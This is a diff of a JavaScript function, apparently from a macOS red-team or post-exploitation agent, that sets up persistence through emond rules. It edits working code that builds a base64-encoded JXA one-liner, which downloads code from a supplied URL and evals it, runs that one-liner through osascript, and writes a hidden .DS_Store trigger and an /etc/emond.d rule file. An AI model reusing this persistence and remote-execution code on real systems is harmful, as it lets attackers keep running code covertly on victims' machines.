@@ -12,10 +12,10 @@ exports.persist_emond = function(task, command, params){
         if(payload_type === "oneliner-jxa"){
             if(config.hasOwnProperty('url') && config['url'] !== ""){var url = config['url'];}
             else{ return "URL is required for the oneliner-jxa payload_type"; }
-            var command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
+            let internal_command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
             url + "')),$.NSUTF8StringEncoding)))";
             // now we need to base64 encode our command
-            var command_data = $(command).dataUsingEncoding($.NSData.NSUTF16StringEncoding);
+            var command_data = $(internal_command).dataUsingEncoding($.NSUTF16StringEncoding);
             var base64_command = command_data.base64EncodedStringWithOptions(0).js;
             var full_command = "echo \"" + base64_command + "\" | base64 -D | /usr/bin/osascript -l JavaScript &amp;";
         }
@@ -86,9 +86,8 @@ exports.persist_emond = function(task, command, params){
             var user_output = "Created " + queueDirectoryPath + "/.DS_Store and /etc/emond.d/rules/" + file_name + " with contents: \n" + plist_contents;
 
             // announce our created artifacts and user output
-            let artifacts = {'user_output': user_output, 'artifacts': [{'base_artifact': 'File Create', 'artifact': queueDirectoryPath + "/.DS_Store"}, {'base_artifact': 'File Create', 'artifact': '/etc/emond.d/rules/' + file_name}], "completed": true};
-            return artifacts
-        }
+            return {'user_output': user_output, 'artifacts': [{'base_artifact': 'File Create', 'artifact': queueDirectoryPath + "/.DS_Store"}, {'base_artifact': 'File Create', 'artifact': '/etc/emond.d/rules/' + file_name}], "completed": true};
+          }
         else{
             return {"user_output":"QueueDirectories array is either not there or 0 in length", "completed": true, "status": "error"};
         }
